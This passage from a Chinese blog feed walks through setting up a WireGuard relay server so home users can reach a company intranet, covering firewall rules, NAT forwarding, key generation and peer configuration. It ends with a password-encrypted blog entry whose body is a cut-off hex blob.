认证码算法：WireGuard使用Poly1305算法进行消息认证。Poly1305是一种基于加密的消息认证码算法，可以在保证安全性的同时提供高效的性能。</li></ol></li><li><p>其实企业想要的就是一个vpn，哪个公司还没有vpn呢/doge，vpn可以突破网络环境以及地域限制，这才是互联网应有的属性。</p></li><li><p>wireguard有几种常见方案，在家发起连接属于NAT后方发起，连接中继服务器公网IP之后将流量转发到内网目标主机上，这刚好适合中继方案。中继服务器充当路由器一样的路由功能（网上能搜到图，这里就偷懒不画了哈）。</p><p>实际流量方向：用户——中继服务器——目标内网服务器</p><p>对于用户与内网服务器来说，中继服务器是透明的，只要配置得当，用户与目标内网服务器相当于共处一个虚拟内网中。</p></li></ul><h2 id="配置流程"><a href="#配置流程" class="headerlink" title="配置流程"></a>配置流程</h2><h3 id="中继服务器配置要求"><a href="#中继服务器配置要求" class="headerlink" title="中继服务器配置要求"></a>中继服务器配置要求</h3><h3 id="防火墙放行端口"><a href="#防火墙放行端口" class="headerlink" title="防火墙放行端口"></a>防火墙放行端口</h3><h4 id="云防火墙层"><a href="#云防火墙层" class="headerlink" title="云防火墙层"></a>云防火墙层</h4><p>如果中继服务器在云端，需要打开云端自带的防火墙。阿里云安全组或腾讯云防火墙 开启wireguard服务的udp端口，默认58210，实际要根据配置文件里的来</p><h4 id="主机防火墙"><a href="#主机防火墙" class="headerlink" title="主机防火墙"></a>主机防火墙</h4><p>公司基于防火墙，自研了一套ip权限管理系统，相当于在家的用户端必须把运营商分配给你家的临时公网IP临时激活，才能通过公司服务器上防火墙策略。</p><p>总之，需要保证主机防火墙对应端口畅通</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw allow proto udp from `待激活ip` to any port 58210</span><br></pre></td></tr></table></figure><ul><li><p>由ip权限管理系统自动创建</p></li><li><p>如果没有加入权限管理系统，手动使用ufw allow proto udp from 企业外部IP to any port 58210</p></li><li><p>ufw allow proto tcp from 10.10.0.0/24 to any port 22，否则无法直接虚拟内网中与中继服务器建立ssh连接，但是取消这条不影响与虚拟内网中的其他服务器建立ssh连接，因为中继服务器转发功能不受ufw，需要单独postup中设置</p></li><li><p>ufw以ufw-user身份在iptables三链五表中进行操作，故不需要再对iptables进行配置，可用iptables -L查看ufw配置后的情况</p></li><li><p>附几条配置中继服务器过程中可能会用到的防火墙命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ufw status</span><br><span class="line">ufw allow proto udp from 180.171.xxx.141 to any port 58210</span><br><span class="line">ufw delete allow proto udp from 180.171.xxx.141 to any port 58210</span><br><span class="line">ufw deny proto udp from 180.171.xxx.141 to any port 58210   拒绝连接</span><br><span class="line">ufw allow proto udp from any to any port 58210 开启所有</span><br><span class="line">ufw allow from 10.10.0.1/24 允许该网段主机访问所有端口</span><br><span class="line">ufw allow proto udp from 192.168.130.0/24 to any port 58210 #需要开启内网访问允许，防火墙工作在真实网络与虚拟网络之间，虚拟网络访问22端口时还会先出防火墙再进来，所以如果要访问虚拟网络中的中继服务器的22（一般不需要），也要打开所有10段的22端口</span><br></pre></td></tr></table></figure><ul><li><p>ufw 本质上是以ufw-user身份操纵iptables，ufw设置之后可在iptables -L 中看到记录</p></li><li><p>wireguard这里一定要用udp协议（可以用ptun实现伪装成TCP流量<a href="https://icloudnative.io/posts/wireguard-over-tcp-using-phantun/">https://icloudnative.io/posts/wireguard-over-tcp-using-phantun/</a> ），是udp包裹着的TCP连接，实测连接建立之后可以ufw delete udp，但掉线重连会失败</p></li><li><p>尽管在同一个虚拟局域网内，要用虚拟IP连接中继服务器的虚拟ip，仍然需要添加并通过ufw防火墙</p></li></ul></li></ul><pre><code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br><span class="line"><span class="meta">#</span><span class="bash">INPUT链 – 处理来自外部的数据。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">OUTPUT链 – 处理向外发送的数据。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">FORWARD链 – 将数据转发到本机的其他网卡设备上</span></span><br></pre></td></tr></table></figure></code></pre><p>下面几条route命令可以不看，本次基本用不到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">route add -net 172.16.6.0 netmask 255.255.255.0 gw 172.16.2.254 dev eth0</span><br><span class="line"><span class="meta">#</span><span class="bash">增加一条网络172.16.6.0/24 经过172.16.2.254 eth0</span> </span><br><span class="line"><span class="meta">#</span><span class="bash">-net增加网络 -host增加主机 netmask 子网掩码 gw 网关 dev 装置,设备,这里是你的网卡名</span></span><br><span class="line">route del gw 172.16.2.254 #删除默认网关172.16.2.254</span><br><span class="line">route del -net 172.16.86.0/24  # 删除默认网络172.16.86.0</span><br></pre></td></tr></table></figure><h3 id="配置准备"><a href="#配置准备" class="headerlink" title="配置准备"></a>配置准备</h3><p><strong>内核要求</strong></p><p>WireGuard 的安装和使用条件<strong>非常苛刻</strong>，对内核版本要求极高，不仅如此，在不同的系统中，<strong>内核，内核源码包，内核头文件</strong>必须存在且这三者版本要一致。所以一般不建议在生成环境中安装，除非你对自己的操作很有把握。Red Hat、CentOS、Fedora 等系统的<strong>内核，内核源码包，内核头文件</strong>包名分别为 <code>kernel</code>、<code>kernel-devel</code>、<code>kernel-headers</code>，Debian、Ubuntu 等系统的<strong>内核，内核源码包，内核头文件</strong>包名分别为 <code>kernel</code>、<code>linux-headers</code>。</p><p>如果这三者任一条件不满足的话，则不管是从代码编译安装还是从 repository 直接安装，也只是安装了 <code>wireguard-tools</code> 而已。而 WireGuard 真正工作的部分，是 <code>wireguard-dkms</code>，也就是动态内核模块支持(DKMS)，是它将 WireGuard 编译到系统内核中。</p><p>所以：</p><ol><li>优先使用内核集成的wireguard。</li></ol><ul><li>最好是ubuntu 22版本，新版本使用5.15内核，内核已经集成wireguard模块，原生效果最优；使用hostnamectl，lsb_release，或uname -a命令查看版本信息。</li><li>一般5.6内核版本以上均集成wireguard模块，个别版本未集成，使用命令modinfo wireguard确定是否集成</li></ul><ol start="2"><li><p>内核版本较低或者未集成的，单独安装内核模块（要求极其严格），推荐使用秋水的脚本wireguard.sh一键安装，然后再自定义配置。<a href="https://teddysun.com/554.html">https://teddysun.com/554.html</a>  </p><p>实测在给不同版本ubuntu安装的时候，偶尔会报各种错误，基本都是搜索一下就能解决的小问题。</p></li></ol><h3 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h3><h4 id="查看内核模块与安装tools"><a href="#查看内核模块与安装tools" class="headerlink" title="查看内核模块与安装tools"></a>查看内核模块与安装tools</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="meta">#</span><span class="bash">内核大于5.6会内置wireguard（ubuntu22）</span></span><br><span class="line"></span><br><span class="line">modinfo wireguard #有些虽然是5.6内核，但没有集成wireguard模块，可此条命令查看</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于内核未集成的，推荐直接用一键脚本，wireguard.sh -s</p><p>对于集成的，按照以下步骤即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">modprobe wireguard  #加载模块</span><br><span class="line">lsmod | grep wireguard</span><br><span class="line">apt install wireguard-tools  #紫屏提示重启esc tab cancel</span><br></pre></td></tr></table></figure><hr><p>安装好模块和tools之后，下面对其配置</p><p>用脚本安装的先执行下面两条</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo wg-quick down wg0 #停止wg0网卡</span><br><span class="line">rm -rf /etc/wireguard/* #清空所有初始配置</span><br></pre></td></tr></table></figure><hr><h4 id="配置虚拟网卡"><a href="#配置虚拟网卡" class="headerlink" title="配置虚拟网卡"></a>配置虚拟网卡</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wg genkey | sudo tee /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickey    #tee显示程序的输出并将其复制到一个文件中</span><br><span class="line">touch /etc/wireguard/wg0.conf #生成一个虚拟网卡wg0</span><br></pre></td></tr></table></figure><h4 id="wg0-conf配置文件内容"><a href="#wg0-conf配置文件内容" class="headerlink" title="wg0.conf配置文件内容"></a>wg0.conf配置文件内容</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey = private key here</span><br><span class="line">Address = 10.10.0.1/24 #IP网段可使用10.10.0.1/24， 确保该网段没有被你的家庭或公司网络使用，当然，如果熟悉路由表CIDR标记法以及最长匹配原则，实测也是可以的。</span><br><span class="line"><span class="meta">#</span><span class="bash">Address = fd86:ea04:1111::1/64</span></span><br><span class="line">SaveConfig = true #需要先停止服务再添加配置最后重启，作用：wireguard配置后不需要restart或reload，使用wg命令添加peer即可立即生效</span><br><span class="line">PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eno1（替换为你自己的公网网卡） -j MASQUERADE; ip6tables -A FORWARD -i wg0 -j ACCEPT; ip6tables -t nat -A POSTROUTING -o eno1 -j MASQUERADE</span><br><span class="line">PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eno1 -j MASQUERADE; ip6tables -D FORWARD -i wg0 -j ACCEPT; ip6tables -t nat -D POSTROUTING -o eno1 -j MASQUERADE   #用于iptables中配置NAT路由转发，否则会出现中继服务器与各个peer可以建立通信，但中继服务器以外的peer不可通信，原因就是这里iptables的转发表没开，这个过程实现从虚拟网络转为实际网络。另外还要开启转发功能</span><br><span class="line">ListenPort = 51820 #本地监听端口</span><br></pre></td></tr></table></figure><h4 id="配置NAT转发"><a href="#配置NAT转发" class="headerlink" title="配置NAT转发"></a>配置NAT转发</h4><p>除了配置文件里的postUp与postDown之外，需要按照以下步骤开启转发功能（不影响本机接收），内核可以正确路由我们的NAT流量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &#x27;cat &lt;&lt; EOF &gt;&gt; /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward=1</span><br><span class="line">net.ipv6.conf.all.forwarding=1</span><br><span class="line">EOF&#x27;</span><br><span class="line">sudo sysctl -p</span><br><span class="line"><span class="meta">#</span><span class="bash">/etc/sysctl.conf是一个允许改变正在运行中的Linux系统的接口，它包含一些TCP/IP堆栈和虚拟内存系统的高级选项，修改内核参数永久生效。 也就是说/proc/sys下内核文件与配置文件sysctl.conf中变量存在着对应关系</span></span><br></pre></td></tr></table></figure><h4 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo wg-quick up wg0  #开启虚拟网卡wg0</span><br><span class="line">sudo wg #查看是否正常运行</span><br><span class="line">systemctl enable wg-quick@wg0  #开机自启</span><br><span class="line">wg-quick up /etc/wireguard/wg0.conf   #添加客户端信息时不需要停止</span><br><span class="line">wg-quick up wg0 #可以不写路径，直接写网卡名</span><br><span class="line">wg-quick down /etc/wireguard/wg0.conf  #修改配置文件时需要先停止</span><br></pre></td></tr></table></figure><h4 id="添加客户端"><a href="#添加客户端" class="headerlink" title="添加客户端"></a>添加客户端</h4><ul><li>不需要关闭中继服务器端的wg0接口</li><li>wireguard遵循p2p，都认为是peer端，其实并没有客户端服务端一说，为了方便理解，本篇文章场景下把非中继服务器端都称为用户端</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo wg set wg0(虚拟网卡名) peer 用户端公钥 allowed-ips 10.10.0.3/32(用户端address)</span><br><span class="line"><span class="meta">#</span><span class="bash">例如</span> </span><br><span class="line">sudo wg set wg0 peer L8qYQ9tDAb72U077替换为你自己peer的公钥5/h/p0AUezaiXRFg= allowed-ips 10.10.0.3/32</span><br><span class="line"><span class="meta">#</span><span class="bash">会写入wg0.conf的peer配置中，其中endpoint支持漫游，根据实际动态变化，中继服务器会根据该文件中的ip地址动态生成路由树</span></span><br></pre></td></tr></table></figure><h2 id="用户端配置过程"><a href="#用户端配置过程" class="headerlink" title="用户端配置过程"></a>用户端配置过程</h2><p>wireguard跨平台，支持图形化界面配置，官方下载地址<a href="https://www.wireguard.com/install/">https://www.wireguard.com/install/</a> </p><p>安装好后按照以下方式配置即可，win与linux用户端配置类似，很简单</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Interface] #用户端接口配置</span><br><span class="line">PrivateKey = #自动生成你的私钥</span><br><span class="line">Address = 10.10.0.2/32   #用户端的虚拟IP地址，CIDR表示法</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = 9sic4rkD8rqiEcCB替换XdXl6ePYnTbTNuKqoASFI= #中继服务器公钥</span><br><span class="line"><span class="meta">#</span><span class="bash">AllowedIPs = 10.10.0.1/32 <span class="comment">#此时只能给虚拟局域网里的10.10.0.1通信</span></span></span><br><span class="line">AllowedIPs = 10.10.0.1/24 #此时可给10.10.0.1~10.10.0.255通信</span><br><span class="line"><span class="meta">#</span><span class="bash">在客户端里，伙伴主机以peer配置里的AllowedIPs形式存在</span></span><br><span class="line"><span class="meta">#</span><span class="bash">在中继服务器里，伙伴主机配置以多条peer形式存在，通过<span class="built_in">set</span>方式动态添加，无需关闭wg0接口</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowedIPs = 0.0.0.0/0 <span class="comment">#拦截用户端所有流量,相当于vpn的全局模式</span></span></span><br><span class="line">Endpoint = 61.xxx.xxx.52:51820 #curl cip.cc 查看外网ip</span><br><span class="line">PersistentKeepalive = 25 #每25s刷新一次</span><br></pre></td></tr></table></figure><ul><li>AllowedIPs是本地端点允许向对端发送流量的 IP 地址范围。AllowedIPs设置24位子网掩码，可以使得相同方式配置的机器互相通信，处于同一个虚拟网段</li><li>图形化界面可能会遇到一个选项<code>On-Demand</code>，有<code>Ethernet</code>和<code>Wi-Fi</code>选项，如果勾选，那么会在选中网络中会自动开启vpn</li><li>在上述配置中，服务端的 AllowedIPs 为 10.10.0.2/32，客户端的 AllowedIPs 为 10.10.0.1/32。这意味着，服务端只允许向客户端 IP 地址 10.10.0.2 发送流量，客户端只允许向服务端 IP 地址 10.10.0.1 发送流量。</li><li>由于 WireGuard 是一种点对点 VPN 技术，每个对等点都必须指定自己的 IP 地址范围。这些 IP 地址范围会根据配置文件中的 AllowedIPs 字段相互交叠，以便在两个对等点之间建立通信隧道，并使它们能够相互通信。</li><li>10.0.0.1/24，表示对等点 A 允许向 IP 地址 10.0.0.1 至 10.0.0.255 范围内的主机发送流量</li></ul><hr><h2 id="一个实操demo"><a href="#一个实操demo" class="headerlink" title="一个实操demo"></a>一个实操demo</h2><ol><li>在中继服务器上注册vpn对象</li></ol><p>sudo wg set wg0 peer D+orfhGdavE5这是Peer1的公钥wVkFqgQNEKJH0yA= allowed-ips 10.10.0.11/32</p><p>sudo wg set wg0 peer P4JCrE3S6K这是peer2的公钥2x3A74o5Dq1twnSKj2hqAgx1U= allowed-ips 10.10.0.51/32</p><ol start="2"><li><p>linux的peer端配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey = eN1KlhehSnz5y该peer自己的私钥UsARc9GMvUXF6dbEQ=</span><br><span class="line">Address = 10.10.0.11/32</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = 9sic4rkD8rqiE中继服务器的公钥XdXl6ePYnTbTNuKqoASFI=</span><br><span class="line">AllowedIPs = 10.10.0.1/24</span><br><span class="line">Endpoint = 192.168.xxx.xxx:51820 #中继服务器内网地址</span><br><span class="line">PersistentKeepalive = 25</span><br></pre></td></tr></table></figure></li><li><p>windows的peer端配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey = WJOc71I0qf84cD替换为该peer端自己私钥7/b63Od5/3obN10o28=</span><br><span class="line">Address = 10.10.0.2/32 # 该peer在虚拟内网中的虚拟ip</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = 9sic4rkD8rqiEcCBMz替换为中继服务器的公钥nTbTNuKqoASFI=</span><br><span class="line">AllowedIPs = 10.10.0.0/24 #允许10.10.0.x这个网段的所有ip与此peer通信，也是根据此建立该虚拟网卡的路由树的</span><br><span class="line">Endpoint = 61.xxx.xxx.52:51820 #中继服务器的公网ip</span><br><span class="line">PersistentKeepalive = 25</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>此时windows可以与linux共处虚拟局域网10.10.0.0/24，可以ping通，互相建立ssh协议（中继服务器防火墙要开ssh的tcp端口给虚拟内网转发使用）</p></li></ol><h2 id="更多参考资料"><a href="#更多参考资料" class="headerlink" title="更多参考资料"></a>更多参考资料</h2><ul><li><p>关于wireguard，网上有个叫<strong>米开朗基杨</strong>的佬总结的挺全的。贴上他链接<a href="https://icloudnative.io/posts/wireguard-docs-practice/">https://icloudnative.io/posts/wireguard-docs-practice/</a></p><p><a href="https://cloud.tencent.com/developer/article/1752845">https://cloud.tencent.com/developer/article/1752845</a></p><p><a href="https://jishuin.proginn.com/p/763bfbd38cdc">https://jishuin.proginn.com/p/763bfbd38cdc</a></p></li><li><p>chatGPT是很好的老师</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireguard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>testblog2</title>
      <link href="2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/testblog2(%E5%B7%B2%E9%9A%90%E8%97%8F)/"/>
      <url>2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/testblog2(%E5%B7%B2%E9%9A%90%E8%97%8F)/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b461d95c23759e921a1ad859c424c6839412c8c97b7bec581bf59d95a8e00311">99eff0d68cb5846714240b8e48cd141edabcf35f1a7ed9e66a4469d8b1e2fa4d1d56cbc10dda486ae37f8720038a062d1a1c479b9f93e1373ac1cb92c8222b0c1e90720aac7250c7a2cc940fb5d0c55fcd7ce3daa57d7423213bbb71e4a69c06e13dffc0f4db3c2f21ff84ff848425127f2e7bd096f9b9acbc3981ae9af16b265bafe16e1ae20607f36fcca297476287ff109a63dccd02bea5b9e10e66525bbcca593cf7e3b2d5b7541d28ff20c7cb8de3f614ab3fa3ebe12a58ae9bd92888b1ad2d64d6c1b5491254dbf569dafdea4bca3e09f9cc9fcbafd41175e4bc26f2d7309b29d6b7af17e39eea96a942bd9c67f7077dd9d048dfdfc796310eae544425c8b55b5be2e01f567cd4b2686af0b8798953ca25988a09dc0b43bc199ba2b48b17d5362df0cfee653ab70a1f92f5bed70c6511cf1e84d0ff75c627cfbb1ad15a9b69931f2d425e13282daf65f83d99b132911e75c465bd0b02b5ff83a38f13e6d1201a604a2092998fb9ac1a257070a6d09e6ca77cbc4c8de78ab22416a6eda0a5b22efe2437896ec500e5f9da98cb479eb7c890e436ad6bbaf2ccb253e0110f24d03a9d2e2795fef97c98c265ced3c9e0224f287766a702847191ab912a9d09ccafe9bc01727e021b84842624282a1954b729f6b74f98380e5e1ba7d0082cff8f86f40303ddd992177d5d6180ae6788bade2a55a58e177fe7d9b43c4b99b3aae4ac16a3f1b8345514e8577a592cab1dc2fad8e3ec16ca5235b140562ea2598285b7c33c0ed349f1a4ffeb927d0a4c6c6cb43454d41eec4b7d6a6828d3bbf3afd171bc980a3bb21e4c730961df92656fac8a892115009f547275d4245ff9d848bd82d928243dc66bacdd8a4f5916fa6c3b81216b16e5c862ab323741a44c0e6d2d650f83fa4914afc2d4b84d3a974fe9a3ef9acabaa24fa6bdca4539976638fc96445df6f5fdc4ee69be418a8fe478efe2d1e57e542d024af11be2f43182ec158d4d54db13f1c80fa6ac0e3ed9ba7f0d52c26642e5e59a9323051873ba4c9e252656917f3adc6eca8aff472384b2a0c30126021a8a5bcc921734fe215bf8509de1573690d1747555c6830beccd01bf46aa83bc92feb9afa179001066bd801b0b3322bebf152bcc75125e3f8ca600e8e30ae56676ba73afc4ee772181256c05304905551f70e77978d6a116faf5971ab4c183ace62302871ab3034f3ea4227c2c788343dc62c70b1200a54efc3750eacaf760685b9c8ce0118f55e47528baabceb2cdf16255f9bb519971d466a37b3f109adfb6f1044bab8bf5c1b055b6c3455f070cc7018f08d2db120b7047f5ca7fb7b28d16e1ab017b67b946d9c35bdea0fa0daaf88ca97995e2c76e2757d39e88603422a56c83767ec012d1f8937f86b9f8108906c87a10debbbcbf90b9f71c07b4904517d1d0ad11feee5de6cfbfe7395383650493604afa750567db3f56bffced6e88c117dbbb049529456dccff5878f3b285552401ec606569ea5412c3fef26287e20220c3bbb07967f8f912691cfbc2de3fc3a5105a13d2160c1125a756ae086504ac72bf0c5f54feeb9dfd0d414f653f0cd58729151a37faa9b5248c5842ced428a3c4f4ceb8ea55ab3dbe0681f146629700c7c16bb3530eaf3807aeeabd4694b50b73a3977657b58c13dfc7b1078b0e18c786ddfaec048e1f1a72e61d7e1da5615a33e4441cb305d9ca53007abe2330b5366cec1b4f3d0ea0c5beb1410ffadf213a00bc3c207affdc105e252f65fc73867bbee4765e8dd54c2d833b73607679ae801921af3189a0c62426558e488eef7fc4fa91152358454477e7daac4b210f69e713258d020f194adff9bae63d5cd8adc1c9b94ba9f810203d5a7eaa968f4caae09af5d69b737c73e60e1832dba12f5a59479592237776995e6568b6f345b73176a0cd1733a97b78f1ccd4d282a5aca49a9e381a5966052bb7a18d59e9347cfce3ddfeca377e617eb387b427ad75dfc752231a609ba3a3c87da651c1079872757c6bbce8b15068481b6bb99fa9b7dcf9dd360bdab728115adc9300c6d4aaadd6fcdf2f0c65d44a7ef249fdc1ba0aa9adca2e8b721e30e9c5ed6d6bb25fe8bae9c20991e79753ad3795892943e40e85ec552c44eaa9067ef80e070323f11b21a55bcf968418bc6269e8b520b592d005ee59ddbf247720f58b5a61defb65437f64cb12fc0362913e08d4304a2cd22fd37ad85f5eb056d36d56dc53691d05c0f2a00cd58779de12b6140520d7d9f47d49b099c2c2f8f859d945f3679f20cb498a96f7074c39e1ed7b1d106c9eddb007264e5e79f5b767cfe09d17e6c266fa8f876e77a8fc676d59b10c7ea713440024bd5bcf97462900b1ded2635040c502952660986ccd718a2453a94f0dd5f479cc669b6a7e0af80a25b4d1ccdf4e345affad209977dd85eeb425274be0f3529e59034f735f6c84b28d6a56ef507fc971627c362a41aebf5ed1a3e4164353f30aecef32ee405c19192395cb5da79f47df8edfb65ebfef83d439accabcfdef749fbe599fd634046bf32cfdd09773165207e65d43c1be009081328f6c1f9fc0e3d06f2ae9803d5876567d8a6d58280f637c4a19196b6154f877825aef41649f8e89be2ccd48fa7b5be32f9b6a1cebb55f1db491557f0a3f4d7e0dab37c5847544080fbac933e85119b95092d948fc3925bc30c24326101541ec320eb5d76378431b054fdeeb9f17bf1b69ff55239e59e9fa617bbba1d5428ed610cd2c3d1792f187b908a62fc01b844afd4fdb4064727b3f1007d5637615defabb5a4c58d07057067eeab0e213153e394e41cc7d31247fbda508fc19f1ede171369b0a186fe7ba1dd20c4c2d30241ec9350d716619298fc1103c3cbb4c1662f2565584cf05776e8ffca215539cc86278af59a9417da4f60e8a68117d704c17c8b03f84dca744142de52ae8c21e5fbb316e847b2fca01dede8283c07378c8daf1a285274c0aa47201331509a35c3365b52f2c93a089607bfb54012d55e2cf121de51ac76257b2053a87c9dc997d026ce11a42fcde6f5104bcc4be4c0faba497bfe2758347a5781cdecc8ee26dc05bf7a5d1b4a59c8d2f990a0cd526b9aed83c050d6bc6164cdd07327617a5fee5b4a3d7a6bdb3e0aac483be662f9891a266ab2ef383a9549f8908e5b7effda6d5c47e8ecd4dc59bd5b1e15b016989b1e419f8ed614f0edfc687efe6a1968fbb816f24241160c41cf50460fb92471411f9c44dbb71d5aaed425cec5d4b1f7d8da4416fef542a16525be3dcbfb41b2d2fe9e13528d8259fc4c6b549706ed20679c025ae4794cf1bc0d5d4fe6fd6603759cc883751ddf24b8e52b464a19e82558172a372f3bec38f25c5518ac8b4f288fe52f5149861b574cd5eb41403387e1c6925afffe1837ee1ab513f9076aa3a339e7610f9bd99ad94cb9a643041e59781cfeb4e7c5ae21432dae609edb108e423e16aeb83e402661e5f0c9c0bf729d04abe556110d81a30d6b0a2aecc53e54c9624cd8d976d0e0df7f0eb195b030bf29c96cc0f95ddd1f4674f0553c0f19700f49b9c6b177ac8d942e64502aefb3711d71d2f608e5272e14ab4752bb481d0488ec2b8f276846e6f688f78b4a238dc98854186e586988750d77f8d88a48bb93e9a0926a9ef3304598c0299a3e549c1ccf25f34206609cd9cf50313331205fdd8b78b79171adac4d3daf600679665f42f6eba5fa511612071ddbf2626aa0bf5d1ae8982799ec2326ebf1abfa05745bc8e6bc3dcdfc3d28d243b581a5d8592d19a38113aa712eacafeb7f5032f6d9effc38a01faf31c4d506d149cde55dd5fbec5b6d33d2ef0652b25a2658e70e71b4294582ff3d4e1a02a75d4145e3a3cd3b0b48b7aee9e9653089875be32ceb2237f25d13467313eec8cebb8969d86f0f5f55a17346d58a4ed98ffb4e06e7b1951e8c262a39343ee4c403f664e82f0dceafd3194e87b8ed248ab125665336e0805629a08443bb1a01bc03058cdf13190a398da3b00a40736d7cf98330f011116688bcd84e4dfdce5d9fbba8786a07523fe1c5084165645c9e416a91f03060928f477547fe9069b6a54869e97726ad9a8172fc0413916c413dd7541d23c5606c659d215e3047389e2cbb2dda1bffc3f28dbf6bc966802b312a113be660d3c69443fa76b57c37fa1ae1f9ae0f8f5bf401a2f5e87003bd603f0f32b4b633b50400565a374567ec72e5bc9c8010f36ca5cb1d90e458d7552e8edd9b67468bc25fb1b2b1f2bf78b141002eba63503783decc851270b1a339b860bfce2386e985469632970e0d5b73a5dbca9cfddffacc74093d30ccb21161cc42a0b12e429ff50e3fd058c1d33e0432eba67fd032815fae5481e01658d99787736736407214ad6faace9c7805e88bcf929f461e34d1b0f2c74e1ae0cf61a3f47582fb4484106970c1386d91aa3413c06b8e2557d359f4df2f80e0b2eac2efd378c2ae9b67a892db5f44ced12819cbaa8880898797f6601d12a31534f9885317c3760e6d691efa2a490d831b0f362e6053142edad7d880f9c786e601c43fd13c86540bd160846a0b0dfcafa0b0650fecdd36a4988dba37d7e3895755113dc0d3676c55d26a48f3f2fb60b4fbab175ac88d1b75984b5a248941f921671c4bc4c98966facfd426a053d67fc1616b8d72395e7387e1400cb6bc14a19b77f60984c1012b54ef10cd3109cf8871a34ba2cf8472247422c70a60e9a818160fa2187314478d4427388de977b66b6d7361167a454594b736522370a608c6dd06b74724be696b2e909ffef2606a57c110b3e3a8d36ac5dc8d05014cdd11d345cf39eab730a09e54d5557578516755af322fd3977a240cf68f232ac6871f577e763bfbd13a21632319d9ec2ecda3eb95948290c16d35a9f26e73bfd050bf5feaba251d24475fb4197daa0e06d0398acbd8f67802b6f7394655118cb3a949424fa53643379d78a1a142f09140c24aaccd49a6daa4beac6862f091c6196db912f00e48619c20bfb9f1d1e54893eab3a01d2f53dcc4890a13a63b96f54ad65c9db54e492997ffa9d807771508edc39fb452eaf417721757300e45d3b731589366f0f</script>  <div class="hbe hbe-content">    <div class="hbe 